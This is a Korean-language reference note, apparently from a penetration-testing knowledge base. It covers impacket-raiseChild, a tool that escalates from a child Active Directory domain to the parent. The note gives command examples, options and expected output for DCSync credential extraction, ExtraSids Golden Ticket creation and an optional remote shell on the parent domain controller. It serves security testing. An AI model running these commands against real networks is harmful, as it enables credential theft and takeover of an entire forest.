---
tags:
  - 환경/ad
  - 서비스/kerberos
  - 기능/권한상승
실행환경: ["Linux"]
필요권한: ["자식 도메인 관리자 또는 자식 도메인 krbtgt를 DCSync할 수 있는 권한"]
필요조건: ["같은 포리스트의 자식·부모 신뢰 관계", "자식 도메인 인증 자료", "자식·부모 KDC와 부모 DC RPC 도달성"]
결과: ["부모 도메인 대상 계정의 NT hash와 Kerberos key", "선택 시 부모 DC 원격 셸"]
---

# impacket-raiseChild

## 도구 개요

`impacket-raiseChild`는 같은 포리스트의 자식 도메인에서 부모 도메인으로 이어지는 ExtraSids 공격 체인을 자동화한다. 자식 `krbtgt` DCSync, Golden Ticket 생성, 부모 계정 DCSync와 선택적 원격 실행을 단계별로 연속 검증할 때 사용한다.

## 필요한 입력과 실행 환경

- 실행 위치: 자식·부모 도메인을 DNS로 해석하고 양쪽 KDC TCP/UDP 88번과 부모 DC RPC에 연결할 수 있는 Linux 호스트.
- 인증 입력: 자식 도메인 관리자 또는 자식 `krbtgt`를 DCSync할 수 있는 계정의 비밀번호·NT hash·AES key.
- 기본 추출 대상: 부모 도메인의 RID 500 계정. `-targetRID`로 변경할 수 있다.
- 선택적 원격 실행: `-target-exec`는 먼저 추출한 부모 대상 계정 credential을 사용해 지정 호스트에 접속한다.

## 표준 사용법

```bash
impacket-raiseChild [options] '<CHILD_FQDN>/<CHILD_USER>:<PASSWORD>'
```

## 대표 예시

### 자식 도메인 비밀번호 인증으로 자동 체인 실행

```bash
impacket-raiseChild '<CHILD_FQDN>/<CHILD_ADMIN>:<PASSWORD>'
```

### 자식 도메인 NT hash로 실행

```bash
impacket-raiseChild -hashes :<CHILD_ADMIN_NT_HASH> '<CHILD_FQDN>/<CHILD_ADMIN>'
```

### 부모 대상 RID와 원격 실행 호스트 지정

```bash
impacket-raiseChild -targetRID <ROOT_TARGET_RID> -target-exec <ROOT_DC_FQDN> '<CHILD_FQDN>/<CHILD_ADMIN>:<PASSWORD>'
```

### 생성한 Golden Ticket을 파일로 저장

```bash
impacket-raiseChild -w <CCACHE_FILE> '<CHILD_FQDN>/<CHILD_ADMIN>:<PASSWORD>'
```

확인할 출력:

- 자식·부모 도메인 발견, 부모 Enterprise Admins SID, 자식 `krbtgt` key, Golden Ticket 생성, 부모 대상 계정 credential 추출이 단계별로 표시되어야 한다.
- 원격 셸이 열렸다면 앞 단계에서 추출한 부모 대상 계정 자격 증명으로 별도 인증한 결과다.

## 주요 옵션

| 옵션 | 의미 | 사용하는 상황 |
|---|---|---|
| `-hashes` | 자식 도메인 요청자 계정의 LM:NT hash로 인증 | 평문 비밀번호 없이 자식 `krbtgt` DCSync를 요청할 때 |
| `-aesKey` | 자식 도메인 요청자 계정의 Kerberos AES key로 인증 | AES 기반 인증 자료를 보유했을 때 |
| `-k`, `-no-pass` | ccache 등 Kerberos 인증 사용 | 요청자 ticket이 있고 DNS·realm·시간이 정합할 때 |
| `-targetRID` | 부모 도메인에서 DCSync할 대상 RID 지정 | 기본 RID 500 이외 계정을 추출할 때 |
| `-target-exec` | 추출한 부모 대상 계정 credential로 원격 실행 | credential 추출과 셸 획득을 연속 검증할 때 |
| `-w <CCACHE_FILE>` | 생성한 Golden Ticket을 지정한 ccache 파일에 저장 | 자동화 중간 산출물을 수동 검증할 때 |

## 도구 고유 출력

| 출력·상태 | 의미 | 다음 확인 |
|---|---|---|
| 자식·포리스트 도메인과 SID 출력 | 도메인 발견 단계 성공 | 도메인 관계와 Enterprise Admins SID 확인 |
| 자식 `krbtgt` hash·key 출력 | 자식 DCSync 성공 | Golden Ticket 생성 단계 확인 |
| ticket 생성 출력 | ExtraSids ccache 생성 단계 성공 | 양쪽 KDC와 부모 realm service ticket 처리 확인 |
| 부모 대상 계정 hash·key 출력 | 부모 DRSUAPI DCSync 성공 | 추출 대상과 credential 종류 확인 |
| 원격 shell 출력 | 추출한 credential로 별도 원격 실행 성공 | 실제 `whoami`, `hostname`과 관리자 권한 확인 |
| 도메인 발견·KDC·DRSUAPI 오류 | 자동 체인의 해당 단계에서 중단 | 마지막 성공 단계 다음의 DNS·포트·인증·권한을 확인 |

## 관련 공격기법

- [[자식 도메인 ExtraSids Golden Ticket]]
